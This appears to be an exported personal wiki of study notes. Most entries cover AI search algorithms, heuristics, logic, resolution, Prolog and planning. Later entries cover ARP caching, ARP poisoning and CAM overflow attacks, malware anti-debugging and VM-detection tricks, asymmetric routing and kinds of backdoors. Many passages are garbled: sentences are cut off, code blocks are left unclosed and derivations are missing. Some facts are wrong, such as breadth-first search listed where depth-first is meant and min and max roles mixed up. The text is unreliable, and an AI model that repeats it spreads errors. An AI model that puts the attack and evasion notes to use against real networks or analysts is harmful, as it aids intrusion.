<pre>!Turing Test (1950)

The computer is interrogated by a human via a teletype, it passes the test if the human cannot tell if its a computer or a human at the other end. 

!Chinese Room Argument
In the chinese argument model there is a operator sitting in a room and isolated from outside world. The operator has with him a translation book, which allows him to lookup any incoming chinese messages and responds with the corresponding reply message in the book which is also in chinsese. To the outisde world it looks as if the operator understands chinese. 
But the operator does not understand the semantics of the language.

!!Basic Search algorithm
# Iniitalise : Set OPEN = {s}
# Fail: If OPEN ={}, terminate with failure
# Select : Select a state, n, from OPEN
# Teminate : If n //belongs to// G, terminate with success
# Expand : Generate the successors of n using O and insert them in OPEN
# Loop : Go to step 2

If OPEN is a stack then we have DFS (depth-first-search). 
If OPEN is a queue then we have BFS (breadth-first-search).

If the size of state space is very large, then DFS might take more time than BFS. 
If the size of state space is inifinite, then DFS might not even terminate. 

!!!Complexity
* b: branching factor       d: depth of the goal      m: depth of the state space tree
* Breadth-first search:
** Time: 1 + b + b^^2^^ + ... + b^^d^^ = O(b^^d^^)
** Space : O(b^^d^^)
* Breadth-first search
** Time: O(b^^m^^)
** Space : O(bm)

!!!Iterative deepening
* Perform DFS repeatedly using increasing depth bounds. 

!!!Bi-directional serach
This is possible only if the operators are reversible. The search starts from the top and bottom, the result will be place where both places merge. 

!!!Basic Search Algorithm with the explicit space
# Iniitalise : Set OPEN = {s}
# Fail: If OPEN ={}, terminate with failure
# Select : Select a state, n, from OPEN ''and save n in CLOSED''
# Teminate : If n //belongs to// G, terminate with success
# Expand : Generate the successors of n using O and insert them in OPEN ''if the successor m //does not belong to// [OPEN //U// CLOSED]''
# Loop : Go to step 2

!!!Basic Search Alogrithm with explicit space and ost search 
# Iniitalise : Set OPEN = {s},
		   CLOSED = {},       
		   ''C(s) = 0''
# Fail: If OPEN ={}, Terminate with failure
# Select : ''Select the minimum cost state'', n, from OPEN and save n in CLOSED
# Teminate : If n //belongs to// G, terminate with success
# Expand : Generate the successors of n using O 
* For each successor, m:
** if m //does not belong to // [OPEN //U// CLOSED]
*** ''Set C(m) = C(n) + C(n,m)'' and insert m in OPEN 
** if m //belongs to // [OPEN //U// CLOSED]
*** ''Set C(m) = min(C(m), C(n) + C(n,m))''
*** ''If C(m) has decreased and if m //belongs to// CLOSED, move it to OPEN''
# Loop : Go to step 2

This is similar to dijkstra's algorithm, but also works with -ve costs.
If all the costs are +ve, no state comes back to OPEN from CLOSED. 
If the costs are all the same (say unit cost) then the alogrithm would reduce to BFS.

Branch and Bound can be applied to this, by removing any paths with higher cost when we find a path to the goal with a lower cost. This only works in case of +ve costs. 


!!!Basic Search Alogrithm with explicit space and ost search 
# Iniitalise : Set OPEN = {s},
		   CLOSED = {},       
		   C(s) = 0, ''C* = infinity''
# Fail: If OPEN ={}, then return C*
# Select : ''Select the minimum cost state'', n, from OPEN and save n in CLOSED
# Teminate : If n //belongs to// G ''and C(n) &lt; C*, then ''
                ''Set C* = C(n) and Go To Step 2'' s
# Expand : Generate the successors of n using O 
* ''If (C(n) &lt; C* generate the successors of n''
* For each successor, m:
** if m //does not belong to // [OPEN //U// CLOSED]
*** ''Set C(m) = C(n) + C(n,m)'' and insert m in OPEN 
** if m //belongs to // [OPEN //U// CLOSED]
*** ''Set C(m) = min(C(m), C(n) + C(n,m))''
*** ''If C(m) has decreased and if m //belongs to// CLOSED, move it to OPEN''
# Loop : Go to step 2

!The notion of heurisitcsa
Heuristics use domain specific knowledge to estimate the quality or potential of partial solutions. 

Example: Manhattan distance heuristic for 8-puzzle
* Find the manhattan distance for a number from its current position to the position we want it to be, i.e if 5 resides in the 1st square, then find the manhattan distance from 1st square to 5th square. 
* Computing the sum of manhattan distances for all numbers, gives a lower bound on the number of moves that we need to make

Example: Minimum spanning tree for heuristics
* the cost of minimum spanning tree is less than the cost of optimal tour if all costs are +ve 
* If we represent 
** C~~s~~ - cost of minimum spanning tree
** C* - optimal TSP solution 
* then C~~s~~ &lt; C* &lt; 2C~~s~~, works only in eucledian space, which allows triangular inequality

Example: chess programs


!Search problem definition using heuristics
* given 5-tuple [S,s,O,G,h] where
** S is the set of state
** s is the start state
** O is the set of transition operators
** G is the set of goal state
** ''h()'' is a heuristic funciton estimating the distance to a goal
* Goal is to find a minimum cost sequence of state transistions leading from state start &quot;s&quot; to a goal state. 

!!Alogrithm A*
# Initialise:	Set OPEN = {s}, CLOSED = {}
		g(s) = 0, f(s) = h(s), where
** g(n) - minimum cost path from start state to this state 
** h(n) - heuristic estimate of minimum cost path from current state to goal state
** f(n) - g(n) + h(n)
# Fail: 	If OPEN={}, terminate and fail
# Select:	Select the minimum cost state,n, from OPEN. Save n in CLOSED.
# Terminate:    If n //belongs to// G, terminate with success and return f(n)
# Expand:	For each successor, m, of n
* If m //does not belong to// [OPEN //U// CLOSED]
** Set g(m) = g(n) + C(n,m)
** Set f(m) = g(m) + h(m)
** Insert m in OPEN
* If m //belongs to// [OPEN //U// CLOSED]
** Set g(m) = min {g(m), g(n) + C(n,m)}
** Set f(m) = g(m) + h(m)
* If f(m) has decreasd and m //belongs to// CLOSED, 
** move m to OPEN
# Loop :	Go to Step 2


Every node has to be expanded atleast once, and if we can ensure that each node is expanded only once, then we can ensure that we have linear time algorithm to reach the goal. 

Lets say
{{{
S = { n | f(n) &lt; C* }
}}}
Every alogrithm has to visit these states. So if any alogrithm which expands all these ends and linear, is a guaranteed to give out a aymptotically optimal solution. 
We can ensure that a node is not expanded twice, by ensuring that a node is never moved from CLOSED to OPEN. This works in non-heuristic alogrithm with +ve costs.
Heuristic searches require nodes to added back into OPEN from CLOSED. 

!!admissable heuristic
A heuristic is called admissiable if it alway under-estimates, that is, we always have h(n) &lt;= f*(n), where f*(n) denotes the minimum distance to a goal state from state n. 

If a heuristic over-estimates, then this might cause the algorithm to not expand some nodes whose estimates are high, but there might be some goals underneath that node. 

!!Choosing heuristic function

If we have no idea of the problem or heuristic function, choose a heuristic function which is 0 at all states. 
If we don't have good underestimate, but a tight overestimate then its better to go for branch-and-bound. 
If we dont' have good overestimate, but a tight underestimate then its better to go heuristic based search.

!!Results on A*
* At any time before A* terminates, there exists in OPEN a state n that is on an optimal path from s to a goal state, with f(n) &lt;= f*(s)a
* If there is a path from s to a goal state, A* terminates (even when the state space is infinite)
* Alogrithm A* is admissible, i.e, if there is a path from s to a goal state, A* terminates by finding an optimal path. 
* If A~~1~~ and A~~2~~ are two versions of A^^*^^ such that A~~2~~ is more informed than A~~1~~, then A~~1~~ expands at least as many states as does A~~2~~.
* If we have A~~1~~ and A~~2~~ are two versions of A^^*^^ such that both are good heuristics, but none is more informed than the other, then the best way to use them is to use max {h~~1~~(n), h~~2~~(n)} at every state as heuristic function. 
* If the heuristics are very close to optimal, then we will be expanding fewer states.

!!Monotone Heuristics
* An admissible heuristic function, h(n), is monotonic if for every successor m of n:
** h(n) - h(m) &lt;= c(n,m)
* If the monotone restriction is satisfied, then A* has already found an optimal path to the state it selects for expansion. 
* If the monotone restriction is satisfied, the f-values of the states expanded by A* is non-decreasing. 


!!Pathmax
converts a non-monotonic heuristic to a monotonic one:
* During generation of the successor, m of n we set:
** h'(m) = max { h(m), h(n) - c(n,m)) }

!!Non-Admissible heuristics
Non-admissible heuristics can be used to reduce the number of states that have to be expanded. If a sub-optimal solution is also good enough, then using these heuristics which over-estimate tightly are useful in reducing the number of state required to be expanded. 
If we are fine to get a sub-optimal solution which is not more than 1.4 times the optimal solution, then we can use a heuristic function which does not estimate more than 1.4 times the actual cost. 

!!Iterative Deepening A* (IDA*)
similar to iterative deepening for basic non-heuristic search. 
We will use depth-first search with heuristic based cost measures at states. # Set C = f(s)
# Perform DFBB with cut-off C
** Expand a state, n, only if its f-value is less than or equal to C
** If a goal is selected for expansion then return C and terminate
# Update C to the minimum f-value which exceeded C among states which were examined and Go to Step 2   

During the inital stage we will be expanding to upto a certain stage, from then on we only expand only the ones which are the most likely to be optimal. 
It is asymptotically optimal. 


!Problem reduction search
Planning how best to solve a problem that can be recursively decomposed into sub-problems in multiple ways

Examples: matrix multiplication, tower of hanoi, blocks world, theorem proving

!!AND-OR Graphs
* An OR node represents a choice between possible decompositions
* An AND node represents a given decomposition

Problem definition
* given [G,s,T] where
** G: implicitly specified AND/OR graph
** S: start node of the AND/OR graph
** T: set of terminal nodes
** h(n) heuristic function estimating the cost of solving the sub-problem at n
* the goal is to find a minimum cost solution tree

We can also have heuristic function in AND/OR graphs too.  

!!!!Alogrithm AO*
# Initialise: Set G* = {s}, f(s) = h(s)
***		If s //belongs to// T, label s as SOLVED
# Terminate: If s is SOLVED, then terminate
# Select: Select a non-terminal leaf node n from the marked sub-tree
# Expand: Make explicit the successors of n 
** For each new successor, m:
*** Set f(m) = h(m)
*** If m is terminal, label m SOLVED
# Cost Revision: call cost-&gt;revise(n)
# Loop: Go To Step 2

* Cost revision in AO*
## Create Z = {n}
## If Z = {} return
## Select a node m from Z such that m has no descendants in Z
## if m is an AND node with successors r~~1~~, r~~2~~, ...r~~k~~
***	set f(m) = sum [ f(r~~1~~) + c(m,e~~1~~) ]
***	mark the edge to each successor of m 
***	if each successor is labeled solved, then label m as solved.
## if m is an OR node with successors r~~1~~, r~~2~~, ...r~~k~~
***	set f(m) = min [ f(r~~1~~) + c(m,e~~1~~) ]
***	mark the edge to each successor of m 
***	if each successor is labeled solved, then label m as solved.
## If the cost or label of m has changed, then insert those parents of m into Z for which m is a marked successor.

!!Game Trees
* Game trees are OR trees with 2 types of OR nodes,
* Max nodes represent the choice of my opponent, select the max cost successor
* Min nodes represent my choice, select the min cost successor

''Shallow Cut-off'', In the below figure we can see that A is a min node, which is the opponent move, B is our move, at B we are guaranteed to get more than 14, but that is not useful as at A opponent will only allow us to get 10 form the left node, so there is no need to evaluate C.

!Wumpus World
Below is picture of Wumpus world which is a grid. 
* ''PIT''. Grids can have PITs, and if we enter any of the PIT squares we will fall in the pit. All the horizontally and veritcally adjacent squares of the PIT square would have ''Breeze'' in them.
* ''Wumpus''. If we enter a square with a Wumpus we die. A wumpus can exist in the same square as that of PIT. Horizontally and vertiaclly adjacent squares of a wumpus would smell ''stench''. 
* ''Gold'': One of the square in the grid would have gold. The aim of the game is to reach this square. 
* ''Walls'': Some of the sides of squares would have walls, we cannot move through walls
* ''Arrows'': We can have arrows, we can shoot an arrow vertically of horizontally and any Wumpus in that path would get killed. Arrows cannot pass through walls. If a wumpus gets killed it will emit a scream. The agent would have only one arrow.

	----------              -----------------
	    a                        a || c
}}}
The numerator are the given propositions which are valid, denominator is the one we can derive

* ''valid'' : a proposition is ''valid'', if the value of the proposition is true for all value of inputs. So if a proposition is valid, i.e, true of all combinations of input, then its inverse is false for all combination of inputs, i.e the inverse of ''valid'' proposition is ''unsatisfiable''
* ''satisfiable'' : a proposition is ''satisfiable'', if the value of the proposition is true of atleast one combination of inputs

In general, the inference problem is NP-complete (Cook's theorem)

Horn sentences of the form 
{{{

are polytime procedures

!First-order logic
First-order logic is a very generalised version of logic when compared to propositional logic. In first-order logic variables can take any values, not just binary

Like propostions, first-order logic has predicates.
A predicate is defined as P(x,y,z), the value of P depends on the value of x,y,z
Example:
{{{
	forall x, forall y, forall z,  P(x,y,z)
	forsome x, forall  y, forsome z,  P(x,y,z)
}}}

Example :

The samething can be written using functions

	forall x, Loves (x, Mother(x))

!Inference in first-order logic
Inference is propositional logic is easy to define, as the domain of each variable is boolean and beolean satisfiability can be used to solve this. But for first-order logic the domain of the variable can be infiinite, so satisfiability of them is difficult to verify.

!!!Inference Rules
* Universal Elimination
** (for all) x Likes(x, IceCream) with the substitution {x / Einstein} give us Likes(Einstein, IceCream). That is, we know all like icecream, so we can deduce Einstein likes IceCream.
** The substiution has be done by a ground term
* Esistential elimination
** (there exists ) x Likes(x, IceCream), we may infer Likes(Man, IceCream) as long as Man does not appear elsewhere in the knowledge base. Man here is being used as a placeholder to represent x's which like IceCream. 
* Existential INtroduction
** From LIkes(Monalisa, IceCream) we can infer (there exists) x Likes(x, IceCream).

!!!Generalized Modus Ponens
* For atomic sentences p~~i~~, p~~i~~^^'^^, and q, where there is a substitution theta, such that SUBST(theta, p~~i~~^^'^^) = SUBST(theta, p~~i~~), for all i :

!!!Unification
UNIFY(p,q) = theta, where SUBST(theta,p) = SUBST(theta, q)

Examples:
UNIFY(Knows(Erdos,x), Knows(Erdos, Godel)} = {x/Godel}
UNIFT(Knows(Erdos, x), Knows(y,Godel)} = {x/Godel, y/Erdos}
UNIFY(Knows(Erdos, x), Knows(x,Godel)} = F


!!!Horn logic
* We can convert Horn sentences to a cnonical form and then us egenralized Modus Ponens with unifcation. 
** We skolemize(replace 'there exists', with some unused variable name) existential formula and remove the universal ones
** This gives us a conjunction of clauses, that are  inserted in the knowledge base.
** Modus Ponens help us in ingerring new clauses.
* Forward and backward chaining.

!!!Godel's Compeleteness Theorem
* For first-order logic, any sentence hat is entailed by another set of sentences can be proved from that set
* Entailment in first-order logic is semi-decidable, that is, we can show that sentences followfrom premisses if they do, but we cannot always show if they do not. 

!!!Resolution
Given
* p~~1~~ &amp;&amp; p~~2~~ ... &amp;&amp; p~~n1~~ =&gt; r~~1~~ || r~~2~~ .... || r~~n2~~
* s~~1~~ &amp;&amp; s~~2~~ ... &amp;&amp; s~~n3~~ =&gt; q~~1~~ || q~~2~~ .... || q~~n4~~
* Unify(p~~j~~, q~~k~~) = theta

then
* applying A =&gt; B  ==== !A || B, we get
** !p~~1~~ || !p~~2~~ || ... || !p~~j~~ ... || !p~~n1~~ || r~~1~~ || .... || r~~n2~~
* similarly for the second one, we get
** !s~~1~~ || !s~~2~~ || ... || !s~~n3~~ || q~~1~~ || ...q~~k~~ || ... || q~~n4~~
* Applying Unify(p~~j~~, q~~k~~), in the || of the above 2 expansions, 
** we see that (!p~~j~~ || q~~k~~) will always be true, because atleast one of them is true always.
* Now we have, by applying &amp;&amp; on both the expansions, !p~~j~~ in the first term is complement of q~~k~~, so either of the first or second expansions is always true	
** !p~~1~~ || !p~~2~~ || ... || !p~~j-1~~ || !p~~j+1~~ || ... || !p~~n1~~ || r~~1~~ || .... || r~~n2~~ || !s~~1~~ || !s~~2~~ || ... || !s~~j~~ ... || !s~~n3~~ || q~~1~~ || ..|| q~~k-1~~ || q~~k+1~~ || .. || q~~n4~~

!!!Conversion to Normal Form

*** (for all)x~~1~~, (for all)x~~2~~ ... (for all)x~~n~~ [ C~~1~~ &amp;&amp; C~~2~~ .... &amp;&amp; C~~k~~]
* All fist-order logic formulas can be converted to clause form
* Example: Given
*** (for all)x {P(x) =&gt; (for some)z { !(for all)y [ q(x,y) =&gt; p(f(x~~1~~))] &amp;&amp; (for all)y [q(x,y) =&gt; p(x)]}}

** Take the existential closure and eliminate redundant qunatifiers, This introduces (for some)x and eliminates (for some)z, where for x~~1~~, we have the first (for some)x, and since z is not  being used, we eliminate z
*** (for some)x~~1~~ (for all)x {p(x) =&gt; { !(for all)y [ q(x,y) =&gt; p(f(x~~1~~))] &amp;&amp; (for all)y [q(x,y) =&gt; p(x)]}}

** Rename any variable that is qunatified more than once, y has been qunatified twice, so, the y in the first q is not the same y in the second q, both are separately qunatified, 
*** (for some)x~~1~~ (for all)x {p(x) =&gt; { !(for all)y [ q(x,y) =&gt; p(f(x~~1~~))] &amp;&amp; (for all)z [q(x,z) =&gt; p(x)]}}

** Eliminate implication
*** (for some)x~~1~~ (for all)x {!p(x) ||  { !(for all)y [ !q(x,y) || p(f(x~~1~~))] &amp;&amp; (for all)z [!q(x,z) || p(x)]}}

** Move negation inwards
*** (for some)x~~1~~ (for all)x {!p(x) ||  { (for some)y [ q(x,y) &amp;&amp; !p(f(x~~1~~))] &amp;&amp; (for all)z [!q(x,z) || p(x)]}}

** Push the qunatifiers to the right
*** (for some)x~~1~~ (for all)x {!p(x) ||  { [(for some)y q(x,y) &amp;&amp; !p(f(x~~1~~))] &amp;&amp; [(for all)z !q(x,z) || p(x)]}}

** Eliminate existential qunatifiers (skolemization)
*** Pick out the leftmost (for some)y B(y) and replace it by B(f(x~~i1~~, x~~i2~~, ...,x~~in~~)), where:
#### x~~i1~~, x~~i2~~, ..., x~~in~~ are all the distinct free variables of (for some)y B(y) that are universally quntified to the left of (for some)y B(y), and
#### F is an n-ary function constant which does not occur already: Example:
*****(for all)x~~1~~ (for all)x~~2~~ (for all)x~~3~~ (for some)y B(y)
can be written as
B(f(x~~1~~, x~~2~~, x~~3~~)
*** After applying skolemization
****(for all)x {!p(x) ||  { [q(x,g(x)) &amp;&amp; !p(f(a))] &amp;&amp; [(for all)z !q(x,z) || p(x)]}}

** Move all universal qunatifiers to the left
*** (for all)x (for all)z {!p(x) ||  { [q(x,g(x)) &amp;&amp; !p(f(a))] &amp;&amp; [!q(x,z) || p(x)]}}

** Distribute &amp;&amp; over ||
*** (for all)x (for all)z {[!p(x) || q(x,g(x))] &amp;&amp; [!p(x) || !p(f(a))] &amp;&amp; [!p(x) || !q(x,z) || p(x)]}}

** Simplify
*** (for all)x {!p(x) || [ q(x,g(x)) &amp;&amp; !p(f(a))] }

** Deduction
{{{
From C10 and C7, we get

!!!Resolution strategies
* Unit Resolution
** Every resolution step must involve a unit clause
** Leads to a good speedup
** Incomplete
** Complete for Horn knowledge bases
* Input Resolution
** Every resolution step must involve a input sentence (from the query or the KB).
** In Horn KBs, Modus Ponens is a kind of input resolution strategy.
** Incomplete
** Complete for Horn knowledge bases
* Linear Resolution
** Slight generalization of input resolution
** Allows P and Q to be resolved together either if P is in the original KB, or if P is an ancestor of Q in the proof tree
** Linear resolution is complete

? - conc([a], [b], [a,b]) will return true
? - conc([a], Z, [a,b]), prolog would return Z = [b]
? - conc([a], [b], Z), prolog would return Z = [a,b]

Example processing:
? - conc([a,b], [c,d], [a,b,c,d]) 
In the first step it will try to match with the first rule, but failes since the first list should be empty
In the second step X = a L1=[b], L2 = [c,d], L3 = [b,c,d] will result in requirement of conc([b], [c,d], [b,c,d]) ( as in RHS), which is the new sub-goal
To match the sub-goal it will try to match with the first rule, which will fail, and then try the second rule X = b L1 = [], L2 = [c,d], L3 =[c,d], which is the new sub-goal
This new sub-goal with match the first rule

!Iterative Refinement Search
Iterative Refinement Search tries iteratively to optimize the result, One of the examples is TSP, in which any permuatation is a result, the solution required is to optimise the cost of the tour.

Two approaches
# Hill Climbing(find maximum) / Gradient Descent(fidn minimum)
# Simulated Annealing - At high temperatures we take higher cost routes with more probability than at lower temparatures. Lower cost routes are always followed. 

* Hill Climbing
** Makesmoves which monotonically improve the quality of solution
** Can settle in a local minima
** Random-restart hill climbing

* Simulated Annealing
** Initilaize T (temperature)
** If T=0 return current state
** sel next = randomly selcted succ of current
** \E = Varl[next] - Val[current]
** For maxmimising problem, If \E &gt; 0, then set current = next
** Otherwise set current = next with prob e^^\E/T^^
** Update T as per schedule and Go To Step2

!Memory-bounded Search
Search algorithms which try to adapt to the memory limitations.
!!!Memory Bounded A : MA*
* Whenever [OPEN U CLOSED] approaches M, some of the least promising state are removed.
* To guarantee that the alogrithm terminates we need to back upt the cose of the most promising leaf of the subtree being deleted at the root of that subtree.

!Planning
Example: Get tea, biscuits and a book
* Given:
** Initial State: The agent is at ''home'' without tea, biscuits, book
** Goal state: The agent is at ''home'' with tea, biscuits, book
** States can be represented as predicates such as ''At(x), Have(y), Sells(x,y)''
** Actions:
*** Go(y) : Agent goes to y - casues At(y) to be true
*** Buy(z) : Agent buys z - causes Have(z) to be true
*** Steal(z) : Agent steals z

!!!Diff between Planning and Search
* Actions are given as logical descriptions of preconditions and effects.
** This enables the planner to make direct connections between states and actions.
* The planner is free to add actions to the plan whereve they are required, rather than in an incremental way starting from the initial state.
* Most parts of the world are independent of most other parts - hence divide and conquer works well.
* In the example above, the state space could start with how should i reach Have(Tea). I can reach Have(Tea) by Buy(Tea) or Steal(Tea) and so on.

!!!Situation Calculus
* Initial State
** At(Home, s0) &amp;&amp; !Have(Tra, S0) &amp;&amp; !Have(Biscuits,s0) &amp;&amp; !Have(Book,s0)
* Goal state
** (for some)s At(Home,s) &amp;&amp; Have(Tea,s) &amp;&amp; Have(Biscuits,s) &amp;&amp; Have(Book,s)
* Operators:
** (for all) a,s Have(Tea,Result(a,s)) &lt;=&gt; [(a=Buy(Tea) &amp;&amp; At(Tea-shop,s)) || (Have(Tea,s) &amp;&amp; a != Drop(Tea))]
** Result(a,s) names the situation resulting from executing the action a in the situation s.

!!!!Representing States
* States are represented by conjunctions of function-free groudn lieterals, no disjunctions are allowed.
** At(Home) &amp;&amp; !Have(Tea) &amp;&amp; !Have(Biscuits) &amp;&amp; !Have(Book)
* Representing goals, similar to the state example 
* Goals can also contain variables
** At(x) &amp;&amp; Sells(x,Tea)
** The above goal is being at a shop that sells tea
* Action description - serves as a name
* Precondition - a conjuction of positive literals
* Effect - a conjuction of literals(+ve or -ve)

!ARP Cache
An ARP cache is a stored mapping of IP addresses with link layer addresses. The ARP cache is also known as the neighbor table. As with many of the iproute2 tools, more information is available via ip neighbor than with arp.

{{{
[root@tristan]# arp -na
? (192.168.99.7) at 00:80:C8:E8:1E:FC [ether] on eth0
? (192.168.99.254) at 00:80:C8:F8:5C:73 [ether] on eth0

192.168.99.254 dev eth0 lladdr 00:80:c8:f8:5c:73 nud reachable
}}}

The only way to list permanently advertised entries in the neighbor table (proxy ARP entries) is with the arp. 

Entries in the ARP cache are periodically and automatically verified unless continually used. Along with net/ipv4/neigh/$DEV/gc_stale_time, there are a number of other parameters in net/ipv4/neigh/$DEV which control the expiration of entries in the ARP cache. At gc_stale_time the state of the entry will change, reflecting the need to verify the reachability of the link layer address. 


|!ARP cache entry state|!meaning|!action if used|
|permanent|	never expires; never verified	|reset use counter|
|noarp|	normal expiration; never verified	|reset use counter|
|reachable|	normal expiration	|reset use counter|
|stale|	still usable; needs verification	|reset use counter; change state to delay|
|delay|	schedule ARP request; needs verification|reset use counter|
|probe|	sending ARP request|	reset use counter|
|incomplete|	first ARP request sent|	send ARP request|
|failed|	no response received|	send ARP request|

!The ARP Flux Problem
 When a linux box is connected to a network segment with multiple network cards, a potential problem with the link layer address to IP address mapping can occur. The machine may respond to ARP requests from both Ethernet interfaces. On the machine creating the ARP request, these multiple answers can cause confusion, or worse yet, non-deterministic population of the ARP cache. Known as ARP flux [13], this can lead to the possibly puzzling effect that an IP migrates non-deterministically through multiple link layer addresses. It's important to understand that ARP flux typically only affects hosts which have multiple physical connections to the same medium or broadcast domain.

{{{

To fix the problem, if all the interfaces on a different subnet
{{{
sysctl -w net.ipv4.conf.all.arp_filter=1

A more effective solution is
{{{

# that address is configured on that interface.
echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore

# when making an arp request sent through any device, always use an

!ARP Attacks

ARP is unauthenticated
Whoever sends a reply to a requester first wins
#The ARP cache is updated with the contents of the reply
#Sometimes the ARP cache is updated when it gets a reply even if it didn't send a request (depends on OS)
This is exploited by sending forged REPLY packets to a victim to have them update their ARP cache

''Man in the middle'' : Poison the victim with you MAC address for the IP address of the gateway, Host communicates with you instead of the gateway
''Denial of Service'' : Poison the victim with a bogus MAC address and the IP address of the gateway, hosts can't communicate with the gateway
''Hub'' : A network hub broadcasts all packets to all ports
''Switch'' : A switch on the other hand maintains a record of whatever addresses are associated with each switch port in its CAM (~Content-Addressable Memory)

!CAM table overflow
#Attacker sends thousands of bogus MAC addresses to the networ
#Switch's CAM table is updated with each MAC
#The CAM table can only hold so much data, so at some point it becomes full
#The switch then forwards all traffic to al ports again (like a hub)
since switch now acts as a hub, the attacker can now eavesdrop ('sniff') all traffic on that segment

CAM table overflow requires many hundreds if not thousand of spoofed ~ARPs, very noisy and idenfitable attack. Cisco's port security limits the number of MAC addresses on each switch port. Once the limit is reached switch does not recognise any more MAC addresses on that port.

!ARP Poisoning using ARP Request packets

Prior to responding to ARP Request packets, the host will update or 'add' the source protocol address (SPA) and source hardware address (SHA) to its cache. ( specified by RFC 826 )

Attacker sends ARP Request to host with the gateways ip address but with attackers MAC address and source addresses.

Using the ARP cache poisoning technique detailed above, if we poison the ARP cache of the victim with a NULL hardware address (00:00:00:00:00:00) for the destination (i.e network gateway). All frames from the victim to the gateway will be forwarded to all switch ports, allowing us to eavesdrop on that communication

Some ~OSs can be poisoned with their own MAC address for the destination

If a host receives an ARP request or reply with the same protocol address ( IP address ) as its own interface, but with a different hardware (MAC) address. Most Oss will warn the user that a duplicate IP address is in use on the network. Sending many packets like this to the victim could slow down ~OSs like windows.

<pre>!Packing and Encryption

Pakcing is the method that an executable uses to obfuscate an executable or to reduce its size. Packets are typically implemented with a asmall decoder stub which is used to unpack, or deobfuscate the binary in question. Once the decoding of 'unpacking' process is complete, the decoder sutb then transfers control back to the original code of the program. Execution proceeds similarly to that of a normal executable. 

!Virtual Machine Detection

The typical targets for malware authors are stand-alone systems that are being used for everyday tasks such as email, and online banking. If a virtual machine is detected, it is most likely being used to analyze the program. Due to inherent flaws in the X86 architecture, virtualization cannot be supported at the hardware level. Certain instructions cannot be supported at the hardware level. Fox x86 architecture these are composed of SLDT, SIDT and SGDT instructions. The malware author can simply perform these instructions, and compare the results afterwards. Results will be different for virtual machines executing these instructions when compared to real hardware executing them. 

!Debugger Detection

''Windows Debugging API''
The windows operating system implements a robust API for developing custom debuggers for applications. It is implemented using a call-back method which allows the operating system to single-step a running program at the machine instruction level. Detection of this type of debugger is as simple as looking at the process execution block PEB for a running program. One field that is available inside the data-structure is ~BeingDebugged field. If thit bit is set, it indicates that a debugger is attached to the process. Fortunately for the anlayst, this bit can be toggled without losing the debugging capability.

''~INT3 Instruction Scanning''
This instruction causes a CPU trap to occur in the operating system. The trap is then propogated to the running program via the operating system. This provides a method by which a developer can set a breakpoint. However, programmers almost never put int3 instructions directly into their programs so it is likely if this is observed, a process is being monitored. Malware authors have implemented various methods to scan for the prescence of this ~INT3 instruction, and alter execution if it is found. A simple CRC check or ~MD5SUM can detect and validate that the code has not been altered by an ~INT3

''Unhandled Structured Exception Handlers''
Structed Exception Handlers (SEH) are a method of catching exceptions from running applications. Normally when a SEH is reached execution is passed to the handler the program developer has defined, or treated as an unhandled exception and execution halts. Malware authors have seized this as a method for implementing an unpacker. The malware author inserts a SEH and their own handler. This hanlder is typically a set of unpacking instructions. The SEH frame contains a pointer to the previous frame. By triggering SEH executions the stack of a malware program is unwound until an appropriate handler is found. Due to the nature of the debugging interface, the debugger will insert its own SEH handling onto this stack. When the debugged program is run, it will raise an exception. This causes the debugger's stack to catch and handle the SEH instead, possibly crashing the debugger and preventing the malware from unpacking itself. Since there is no way for the debugger to discern between an exception generated by an error in its program, and the debugged program, this typically thwarts unpacking.

''~Mid-Instruction Jumping''
Tpyically a debugger will try to interpret the machine code of a running executable and print out more human readable output. A typical trick that can be performed is to take a long instruction and the value of 0x90  as a parameter. This last parameter, interpreted on its own is the nop, or no-operation instruction. This will cause the CPU to run to the next instruction and continue execution.

''Shifting Decode Frame''
Shifting decode frame is a method by which a protion of the executable is unpacked, executed then re-encoded. This method has the effect of preventing static post-execution analysis. This precludes the ability to step the executable to the position of the original entry point, and dump the entire executable. 

!Dynamic Instrumentation

Dynamic Instrumentation (DI) can be used to trace the exact execution of a debugged binary. Debug tools such as //Vargrind// and //PIN// can provide insight into the exeuction characterstics of a program.

Pin interfaces with the machine code via a series of callbacks that are registered on analysis startup. One can divert execution of a program at each instruction to addresses.

By tracking memory read and writes, we can watch where the program modifies memory locations during the course of execution. Furthermore we can use this information to watch for executions inside of this written memory area.

<div title="Asymmetric Routing" modifier="BhargavaKancherla" modified="200807071138" created="200801150733" changecount="4">
<pre>!Asmmetric Routing
Asymmetric TCP/IP routing causes a common performance problem on servers that have more than one network connection. The atypical network on the example server, interface ''eth0'' is bound to address ''192.168.16.20'' and interface ''eth1'' is bound to ''192.168.16.21''. Each routing policy has an associated priority. Policies with a lower priority number take precedence over policies that also may match the candidate packet but have a higher priority value. The priority is an unsigned 32-bit number, so there is never a problem finding enough priority levels to express any algorithm in great detail. 

At start-up time, the kernel creates several default rules to control the normal routing for the server. These rules have ''priorities'' 0, 32766 and 32767. The rule at priority 0 is a special rule for controlling intra-box traffic and does not affect us. However, we do want our new rules to take precedence over the other default rules, so they should use priority numbers less than 32766. These two default rules also may be deleted if you are sure your replacement routes never need to fall back on the default behavior of the server.

The new policy rules are added using the ip rule add command. The from attribute is used to generate source address-based routing policies.

{{{
#ip rule add from 192.168.16.20/32 tab 1 priority 500
#ip rule add from 192.168.16.21/32 tab 2 priority 600
}}}

Under this setup, outgoing packets first are checked for source address 192.168.16.20. If that matches they use routing table 1, which sends all traffic out eth0. Otherwise the packets are checked for source addresses that match 192.168.16.21. Matches to that rule would use table 2, which sends all traffic out eth1. Any other packets would use the default system rules detailed by rules 32766 and 32767.

{{{
#ip rule show
0:      from all lookup local 
500:  from 192.168.16.20 lookup 1
600:  from 192.168.16.21 lookup 2 
32766:  from all lookup main 
32767:  from all lookup 253 
}}}

Changes made to the policy database do not take effect dynamically. To tell the kernel that it needs to re-parse the policy database, issue the ip route flush cache command:

{{{
#ip route flush cache
}}}

<div title="Backdoors" modifier="BhargavaKancherla" modified="200807071129" created="200801140820" changecount="5">
<pre>!Types of Backdoors
//''System Backdoors''// are backdoors that allow access to data and processes at the system level. Rootkits, remote access software, and delibrate system misconfiguration by an attacker fall in this category.

//''Application Backdoors''// are versions of legitimate software modified to bypass security mechanisms under certain conditions. These legitimate programs are meant to be installed and running on a system with the full knowledge and approval of the system administrator. Applications backdoors are often inserted in the code by someone who has legitimate access to the code. Other times the source code or binary to an application is modified by someone who has compromised the system where the source code is maintained or the binary is distributed.

//''Crypto Backdoors''// are a third category of backdoors. These are intentionally designed weaknesses in a cryptosystem for particular keys or messages that allow an attacker to gain access to clear-test messages that they shouldn't.

!Application Backdoor Classes

''Special Credentials''
